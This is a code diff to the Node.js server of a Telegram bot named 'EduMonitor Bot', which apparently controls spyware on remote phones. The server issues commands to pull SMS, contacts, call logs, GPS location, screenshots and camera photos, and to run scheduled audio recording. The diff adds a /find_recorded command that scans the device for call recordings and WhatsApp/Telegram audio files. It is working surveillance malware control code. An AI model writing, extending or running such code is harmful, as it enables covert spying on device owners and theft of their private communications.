@@ -235,10 +235,9 @@ function getMainMenuKeyboard(chatId) {
             { text: '📱 Devices', callback_data: 'menu_devices' }
         ],
         [
-            { text: '⚙️ Services', callback_data: 'menu_services' },  // ← ADD THIS LINE
+            { text: '⚙️ Services', callback_data: 'menu_services' },
             { text: '❌ Close', callback_data: 'close_menu' }
         ]
-
     ];
 }
 
@@ -344,6 +343,7 @@ async function setChatMenuButton(chatId) {
                 { command: 'location', description: '📍 Get GPS location' },
                 { command: 'screenshot', description: '📸 Take screenshot' },
                 { command: 'record', description: '🎤 Start recording' },
+                { command: 'find_recorded', description: '🔍 Find call recordings' },
                 { command: 'contacts', description: '📇 Get contacts' },
                 { command: 'sms', description: '💬 Get SMS' },
                 { command: 'calllogs', description: '📞 Get call logs' },
@@ -919,23 +919,26 @@ async function handleCallbackQuery(callbackQuery) {
                 createInlineButton('❌ Auto OFF', 'cmd:record_auto_off')
             ],
             [
-                createInlineButton('⚙️ Custom Schedule', 'start_custom_schedule_interactive'),
-                createInlineButton('🎚️ Audio Info', 'cmd:audio_info')
+                createInlineButton('🔍 Find Recordings', 'cmd:find_recorded'),
+                createInlineButton('⚙️ Custom Schedule', 'start_custom_schedule_interactive')
             ],
             [
-                createInlineButton('▶️ Start Recording', 'cmd:start_recording'),
-                createInlineButton('⏹️ Stop Recording', 'cmd:stop_recording')
+                createInlineButton('🎚️ Audio Info', 'cmd:audio_info'),
+                createInlineButton('▶️ Start Recording', 'cmd:start_recording')
             ],
             [
-                createInlineButton('🎤 Audio Ultra', 'cmd:audio_ultra'),
-                createInlineButton('🎤 Audio Very Low', 'cmd:audio_very_low')
+                createInlineButton('⏹️ Stop Recording', 'cmd:stop_recording'),
+                createInlineButton('🎤 Audio Ultra', 'cmd:audio_ultra')
             ],
             [
-                createInlineButton('🎤 Audio Low', 'cmd:audio_low'),
-                createInlineButton('🎤 Audio Medium', 'cmd:audio_medium')
+                createInlineButton('🎤 Audio Very Low', 'cmd:audio_very_low'),
+                createInlineButton('🎤 Audio Low', 'cmd:audio_low')
             ],
             [
-                createInlineButton('🎤 Audio High', 'cmd:audio_high'),
+                createInlineButton('🎤 Audio Medium', 'cmd:audio_medium'),
+                createInlineButton('🎤 Audio High', 'cmd:audio_high')
+            ],
+            [
                 createInlineButton('◀️ Back', 'help_main')
             ]
         ];
@@ -973,7 +976,6 @@ async function handleCallbackQuery(callbackQuery) {
             ],
             [
                 createInlineButton('➕ Add Target', 'cmd:add_target_example'),
-
                 createInlineButton('📱 Target Apps', 'cmd:target_apps')
             ],
             [
@@ -1075,7 +1077,7 @@ async function handleCallbackQuery(callbackQuery) {
                 createInlineButton('◀️ Back', 'help_main')
             ]
         ];
-               await editMessageKeyboard(chatId, messageId, keyboard);
+        await editMessageKeyboard(chatId, messageId, keyboard);
         
     } else if (data === 'menu_about') {
         const keyboard = [
@@ -1087,12 +1089,13 @@ async function handleCallbackQuery(callbackQuery) {
         await editMessageKeyboard(chatId, messageId, keyboard);
         await sendTelegramMessage(chatId,
             "🤖 <b>EduMonitor Bot</b>\n\n" +
-            "Version: 3.1\n" +
+            "Version: 3.2\n" +
             "Features:\n" +
             "• Remote device monitoring\n" +
             "• Multi-device support\n" +
             "• Screenshot capture\n" +
             "• Audio recording\n" +
+            "• Call recording scanner (/find_recorded)\n" +
             "• Data extraction (contacts, SMS, etc.)\n" +
             "• Location tracking\n" +
             "• Schedule recording\n" +
@@ -1291,6 +1294,44 @@ async function handleCommand(chatId, command, messageId) {
         } else {
             await sendTelegramMessage(chatId, '❌ Device not found or not authorized.');
         }
+        return;
+    }
+
+    // Handle /find_recorded command specifically
+    if (command === '/find_recorded' || command === '/find_recordings' || 
+        command === '/scan_recordings' || command === '/scan_recording') {
+        
+        const selectedDeviceId = userDeviceSelection.get(chatId);
+        const device = selectedDeviceId ? devices.get(selectedDeviceId) : null;
+        
+        if (!device) {
+            await sendTelegramMessage(chatId, '❌ No device selected. Use /devices to see available devices.');
+            return;
+        }
+        
+        if (!device.pendingCommands) {
+            device.pendingCommands = [];
+        }
+        
+        device.pendingCommands.push({
+            command: 'find_recorded',
+            originalCommand: command,
+            messageId: messageId,
+            timestamp: Date.now()
+        });
+        
+        console.log(`📝 Find Recorded command queued for device ${selectedDeviceId}`);
+        
+        await sendTelegramMessage(chatId, 
+            `🔍 *Recording Scanner*\n\n` +
+            `📱 Device: ${device.deviceInfo?.model || 'Unknown'}\n\n` +
+            `✅ Scan command sent to device.\n` +
+            `The device will search for:\n` +
+            `• Third-party call recordings\n` +
+            `• Voice recorder files\n` +
+            `• Audio recordings\n` +
+            `• WhatsApp/Telegram audio files\n\n` +
+            `⏱️ This may take a moment...`);
         return;
     }
 
@@ -1996,7 +2037,7 @@ app.post('/api/result/:deviceId', async (req, res) => {
     if (command && (command.includes('_html') || 
         command === 'ip_info' || command === 'phone_number' || command === 'location' ||
         command === 'sim_info' || command === 'wifi_info' || command === 'all_info' ||
-        command === 'mobile_info')) {
+        command === 'mobile_info' || command === 'find_recorded')) {
         console.log(`📎 ${command} using dedicated endpoint`);
         return res.sendStatus(200);
     }
@@ -2247,6 +2288,13 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log('   └─ /camera_switch - Toggle between cameras');
     console.log('   └─ Photos are compressed (640x480, 70% quality)');
     console.log('   └─ Auto-upload of new camera photos');
+    console.log('\n✅ RECORDING SCANNER ENABLED:');
+    console.log('   └─ /find_recorded - 🔍 Find call recordings');
+    console.log('   └─ Searches in:');
+    console.log('       • Third-party recorder apps');
+    console.log('       • Common recording paths');
+    console.log('       • Media directories');
+    console.log('       • WhatsApp/Telegram audio folders');
     console.log('\n✅ APP_OPEN LOG HANDLING:');
     console.log('   └─ Batched every 50 entries into 1 HTML file');
     console.log('   └─ Excluded from regular log sync (20 at a time)');
@@ -2271,7 +2319,7 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log('   └─ Phone: phone_number, sim_info');
     console.log('   └─ Screenshot: screenshot, start_screenshot, stop_screenshot, small, medium, original, size_status, screenshot_settings, compression_stats, target_apps, add_target');
     console.log('   └─ Camera: photo, takephoto, camera_on, camera_off, camera_status, camera_front, camera_back, camera_switch');
-    console.log('   └─ Recording: record, start_recording, stop_recording, record_auto_on, record_auto_off, record_schedule, record_custom, audio_info, audio_ultra, audio_very_low, audio_low, audio_medium, audio_high');
+    console.log('   └─ Recording: record, start_recording, stop_recording, record_auto_on, record_auto_off, record_schedule, record_custom, audio_info, audio_ultra, audio_very_low, audio_low, audio_medium, audio_high, find_recorded');
     console.log('   └─ Location: location, storage, battery, info, time, status');
     console.log('   └─ App: app_opens, app_opens_html');
     console.log('   └─ Realtime: realtime_on, realtime_off, realtime_status');
